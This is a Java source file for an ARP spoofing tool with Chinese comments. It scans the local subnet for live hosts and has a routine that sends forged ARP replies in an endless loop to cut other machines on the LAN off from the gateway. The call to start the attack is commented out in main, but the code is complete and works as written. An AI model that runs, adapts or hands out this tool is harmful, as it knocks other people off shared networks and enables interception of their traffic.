package top.lemonz.blog.tool.impl;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import org.apache.commons.io.FileUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.core.io.ClassPathResource;
import top.lemonz.blog.controller.TestController;

import java.io.IOException;
import java.io.InputStream;
import java.net.InetAddress;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by IntelliJ IDEA.
 *
 * @author NingZe
 * description:
 * path: LEMONBLOG-top.lemonz.blog.tool.impl-NzArpHoaxDisnet
 * date: 2019/12/25 0025 09:42
 * version: 02.06
 * To change this template use File | Settings | File Templates.
 */
public class NzArpHoaxDisnet {

    public static void main(String[] args) throws Exception {

        // 启动方法-欺骗网关-进行局域网断网
        // hoaxGatewayDisnet();
        for (String tarip : IPLIS) {
            System.err.println(tarip);
        }

    }

    /**
     * 日志
     */
    private final static Logger log = LoggerFactory.getLogger(TestController.class);

    /**
     * 重发间隔时间
     */
    public static Integer TIME = 1;

    /**
     * 输入
     */
    public static Scanner SCANNER = new Scanner(System.in);

    /**
     * 本机IP
     */
    public static String MYIP;

    /**
     * 本机MAC
     */
    public static String MYMAC;

    /**
     * 本机IP对象
     */
    public static InetAddress MYIPOBJ;

    /**
     * 本机MAC数组
     */
    public static byte[] MYMACARR;

    /**
     * 网络段
     */
    public static String NETSEGMENT;

    /**
     * 网关IP
     */
    public static String GATEWAYIP;

    /**
     * 网关MAC
     */
    public static String GATEWAYMAC;

    /**
     * 网关IP对象
     */
    public static InetAddress GATEWAYIPOBJ;

    /**
     * 网关MAC数组
     */
    public static byte[] GATEWAYMACARR;

    /**
     * 存储IP-Mac键值对
     */
    public static Map<String, String> IPANDMACS = new HashMap();

    /**
     * 存储IP
     */
    public static List<String> IPLIS = new ArrayList();

    /**
     * 网卡对象
     */
    public static NetworkInterface DEVICE;

    /**
     * 设备发送对象
     */
    public static JpcapSender SENDER;

    /**
     * 非断网IP配置文件地址
     */
    public static String ARPNOTDISNETPATH = "/static/json/ArpNotDisnet.text";

    /**
     * 是否初始化
     */
    public static Boolean BL = true;

    /**
     * 初始化配置静态代码块
     */
    static {
        try {
            if (BL) {
                // 扫描本机IP与MAC
                Map<String, String> locaIpAndMac = NetUtil.findLocaIpAndMac();
                // 本机IP
                MYIP = locaIpAndMac.get("ip");
                // 本机IP对象
                MYIPOBJ = InetAddress.getByName(MYIP);
                // 本机MAC
                MYMAC = locaIpAndMac.get("mac");
                // 本机MAC数组
                MYMACARR = NetUtil.stomac(MYMAC);
                // 网络段
                NETSEGMENT = MYIP.substring(0, MYIP.lastIndexOf("."));
                // 网关IP
                GATEWAYIP = NETSEGMENT + ".1";
                // 网关IP对象
                GATEWAYIPOBJ = InetAddress.getByName(GATEWAYIP);
                // 网关MAC
                GATEWAYMAC = NetUtil.getMacAddress(GATEWAYIPOBJ.getHostName());
                // 网关MAC数组
                GATEWAYMACARR = NetUtil.stomac(GATEWAYMAC);
                // 自动打开默认网卡（失败将自动切换为手动打开）
                SENDER = selfOpenDevice();
                // 扫描并存储网段下所有存活主机的IP与MAC
                IPANDMACS = findAllMacAddress(NETSEGMENT, DEVICE, IPLIS);
                // 删除不断网的IP
                IPLIS = removeArpNotDisnet(IPLIS);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 启动方法-欺骗网关-进行局域网断网
     */
    private static void hoaxGatewayDisnet() throws Exception {
        // 循环发送ARP应答包
        for (int i = 1; true; i++) {
            for (String tarip : IPLIS) {
                // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
                SENDER.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(tarip), GATEWAYMACARR, GATEWAYIPOBJ, 2));
            }
            Thread.sleep(TIME * 1000);
        }
    }

    /**
     * 移除不断网的IP
     *
     * @param iplis
     * @return
     * @throws IOException
     */
    private static List<String> removeArpNotDisnet(List<String> iplis) throws IOException {
        // 存储ip列表（1.读取文件IP配置 2.网关 3.本地IP地址）
        List<String> relis = new ArrayList<>(16);
        relis.addAll(FileUtils.readLines(new ClassPathResource(ARPNOTDISNETPATH).getFile(), "UTF-8"));
        relis.add(GATEWAYIP);
        relis.add(MYIP);
        // 在所有IP列表中移除
        iplis.removeAll(relis);
        return iplis;
    }

    /**
     * 扫描并存储网段下所有存活主机的IP与MAC
     *
     * @throws Exception
     */
    private static Map<String, String> findAllMacAddress(String netsegment, NetworkInterface device, List<String> iplis) throws Exception {
        // 存储 IP-MAC 键值对
        Map<String, String> maps = new HashMap(26);
        // start time
        Long l1 = System.currentTimeMillis();
        // 方式一 + 方式二 即可缩小范围以及更精准的获取有效数据信息
        // 方式一：arp -a ip 扫描存活主机
        // 1. 初始化 1-255 个网络地址，当然也可以自己指定范围（默认情况网关后缀为1，所以从2开始）
        ArrayList<String> list = new ArrayList<>();
        for (int i = 1; i <= 255; i++) {
            list.add(netsegment + "." + i);
        }
        // 2. 扫描当前局域网中所有存活的主机
        log.info("开始扫描当前局域网所有存活主机, 预计耗时: 60 秒.");
        for (int i = 0; i < list.size(); i++) {
            // ip（当前ip地址）
            String tarip = list.get(i);
            // mac（执行cmd命令获得MAC地址）
            String tarmac = NetUtil.getMacAddress(tarip).toUpperCase();
            // 目标主机的MAC不存在，继续下一轮
            if (tarmac == null || tarmac.equals("")) {
                continue;
            }
            log.info("IP-> " + tarip + "   ,   " + "MAC-> " + tarmac);
            // 存储 ip-mac
            maps.put(tarip, tarmac);
            // 存储 ip
            iplis.add(tarip);
        }
        // 方式二：arp 发送请求，以响应结果判断存活主机
        JpcapCaptor captor = JpcapCaptor.openDevice(device, 2000, false, 3000);
        captor.setFilter("arp", true);
        JpcapSender sender = captor.getJpcapSenderInstance();
        for (int i = 0; i < list.size(); i++) {
            // ip（目标ip地址）
            String tarip = list.get(i);
            // 参数介绍
            // 1.网卡MAC地址 2.网卡地址对象中第一个地址对象（其实就是本机地址对象）
            // 3.伪造MAC地址并转换为数组 4.设置需要向其发送ARP请求的主机IP
            sender.sendPacket(constractReqArps(device.mac_address, device.addresses[1].address, NetUtil.stomac("ff-ff-ff-ff-ff-ff"), InetAddress.getByName(tarip), 1));
            // 监听所有捕获到的数据包
            ARPPacket p = (ARPPacket) captor.getPacket();
            if (p == null) {
                // 未获取到返回ARP信息
                continue;
            } else {
                /*
                 * 按照ARP协议的定义，请求目标主机的MAC地址，需要向本局域网内的所有主机广播ARP请求
                 * 挡目标主机监听到此请求
                 * 其会向请求发送方定向的回应自己的MAC地址
                 * 所以我只需要获取响应信息
                 */
                if (p.operation != ARPPacket.ARP_REPLY) {
                    continue;
                }
                // 将byte[]数组解析为标志IP地址
                StringBuilder str = new StringBuilder();
                for (byte part : p.sender_protoaddr) {
                    String hex = (part & 0xff) < 0 ? String.valueOf(part & 0xff + 256) : String.valueOf(part & 0xff);
                    str.append(hex);
                    str.append('.');
                }

                String ip = str.toString().substring(0, str.length() - 1);

                /*
                 * 判断目标主机是否存活
                 * 有两种情况会返回MAC地址为00-00-00-00-00-00
                 * 1.目标IP上不存在存活主机
                 * 2.目标主机已做静态绑定 对于静态绑定的主机是无法向路由器篡改其MAC地址的
                 */
                boolean isAlive = false;
                byte[] deadMac = NetUtil.stomac("00-00-00-00-00-00");
                if (!(p.target_hardaddr[0] == deadMac[0] && p.target_hardaddr[1] == deadMac[1]
                        && p.target_hardaddr[2] == deadMac[2]
                        && p.target_hardaddr[3] == deadMac[3]
                        && p.target_hardaddr[4] == deadMac[4]
                        && p.target_hardaddr[5] == deadMac[5])) {
                    isAlive = true;
                }
                if (!isAlive) {
                    // 目标主机未存活
                    continue;
                }

                // 保存可用的目标主机IP-MAC对
                if (!maps.containsKey(ip)) {
                    str = new StringBuilder();
                    // 解析ARP响应方MAC地址
                    for (byte part : p.sender_hardaddr) {
                        String hex = Integer.toHexString(part & 0xff).toUpperCase();
                        str.append(hex.length() == 1 ? "0" + hex : hex);
                        str.append('-');
                    }
                    String mac = str.toString().substring(0, 17);
                    log.info("IP-> " + ip + "   ,   " + "MAC-> " + mac);
                    maps.put(ip, mac);
                    // 存储 ip
                    iplis.add(ip);
                } else {
                    // 当前扫描IP记录已存在，进入下一轮
                    continue;
                }
            }
        }
        // stop time
        Long l2 = System.currentTimeMillis();
        log.info("扫描完成, 一共 " + maps.size() + " 个主机存活, 实际耗时: " + ((l2 - l1) / 1000) + " 秒.");
        return maps;
    }

    /**
     * 自动-打开网卡
     *
     * @return
     */
    private static JpcapSender selfOpenDevice() throws IOException {
        // 枚举网卡
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        for (int i = 0; i < devices.length; i++) {
            // Realtek公司PCIe接口千兆以太网系列控制器（大多数都是这个呢）
            if ("Realtek PCIe GBE Family Controller".equals(devices[i].description)) {
                // 保存网卡
                DEVICE = devices[i];
                break;
            }
        }
        // 打开失败（默认指定网卡不存在）
        if (DEVICE == null) {
            log.info("自动打开网卡失败. 正在尝试手动开启, 稍等......");
            // 手动选择并打开设备
            return manOpenDevice();
        }
        log.info("自动选择的网卡为: " + DEVICE.description + ".");
        // 打开设备并返回
        return JpcapSender.openDevice(DEVICE);
    }

    /**
     * 手动-选择并打开网卡
     *
     * @return
     */
    private static JpcapSender manOpenDevice() throws IOException {
        // 枚举网卡
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        for (int i = 0; i < devices.length; i++) {
            log.info(i + "." + devices[i].description);
        }
        // 选择网卡
        log.info("选择一个网卡：");
        // 获得指定下标的网卡
        DEVICE = devices[SCANNER.nextInt()];
        log.info("手动选择的网卡为: " + DEVICE.description + ".");
        // 打开设备并返回
        return JpcapSender.openDevice(DEVICE);
    }

    /**
     * 构造ARP包请求
     */
    private static ARPPacket constractReqArps(byte[] sender_hardaddr, InetAddress sender_protoaddr, byte[] target_hardaddr, InetAddress target_protoaddr, int type) {
        // 设置ARP包
        ARPPacket arp = new ARPPacket();
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        // 请求/接收
        switch (type) {
            case 1:
                // ARP_REQUEST 用于请求目标主机的MAC地址
                arp.operation = ARPPacket.ARP_REQUEST;
                break;
            case 2:
                // ARP_REPLY 用于接受目标主机的MAC地址
                arp.operation = ARPPacket.ARP_REPLY;
                break;
        }
        arp.hlen = ARPPacket.HARDTYPE_IEEE802;
        arp.plen = ARPPacket.RARP_REPLY;
        arp.sender_hardaddr = sender_hardaddr;
        arp.sender_protoaddr = sender_protoaddr.getAddress();
        arp.target_hardaddr = target_hardaddr;
        arp.target_protoaddr = target_protoaddr.getAddress();
        // 设置DLC帧
        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = sender_hardaddr;
        ether.dst_mac = target_hardaddr;
        arp.datalink = ether;
        return arp;
    }

    /**
     * @Function: TODO
     * @description: net util class
     * @author: NingZe
     * @date: 2019/12/25 0025 09:47
     * @params:
     * @version: 02.06
     */
    private static class NetUtil {

        /**
         * 执行单条指令
         *
         * @param cmd 命令
         * @return 执行结果
         * @throws Exception
         */
        private static String command(String cmd) throws Exception {
            Process process = Runtime.getRuntime().exec(cmd);
            process.waitFor();
            InputStream in = process.getInputStream();
            StringBuilder result = new StringBuilder();
            byte[] data = new byte[256];
            while (in.read(data) != -1) {
                String encoding = System.getProperty("sun.jnu.encoding");
                result.append(new String(data, encoding));
            }
            return result.toString();
        }

        /**
         * 获取mac地址
         *
         * @param ip
         * @return
         * @throws Exception
         */
        private static String getMacAddress(String ip) throws Exception {
            String result = command("arp -a " + ip);
            String regExp = "([0-9A-Fa-f]{2})([-:][0-9A-Fa-f]{2}){5}";
            Pattern pattern = Pattern.compile(regExp);
            Matcher matcher = pattern.matcher(result);
            StringBuilder mac = new StringBuilder();
            while (matcher.find()) {
                String temp = matcher.group();
                mac.append(temp);
            }
            return mac.toString();
        }

        /**
         * 获得本机IP与MAC（只限于本机）
         *
         * @return
         */
        private static Map<String, String> findLocaIpAndMac() throws Exception {
            // 获得本地地址对象
            InetAddress ias = InetAddress.getLocalHost();
            // 获得网络接口对象（即网卡），并得到mac地址，mac地址存在于一个byte数组中。
            byte[] mac = java.net.NetworkInterface.getByInetAddress(ias).getHardwareAddress();
            // 下面代码是把mac地址拼装成String
            StringBuffer sb = new StringBuffer();
            for (int i = 0; i < mac.length; i++) {
                if (i != 0) {
                    sb.append("-");
                }
                // mac[i] & 0xFF 是为了把byte转化为正整数
                String s = Integer.toHexString(mac[i] & 0xFF);
                sb.append(s.length() == 1 ? 0 + s : s);
            }
            return new HashMap(2) {{
                put("ip", ias.getHostAddress());
                put("mac", sb.toString().toUpperCase());
            }};
        }

        /**
         * mac地址转byte数组的方法
         */
        private static byte[] stomac(String s) {
            byte[] mac = new byte[]{(byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00};
            String[] s1 = s.split("-");
            for (int x = 0; x < s1.length; x++) {
                mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
            }
            return mac;
        }

    }

}
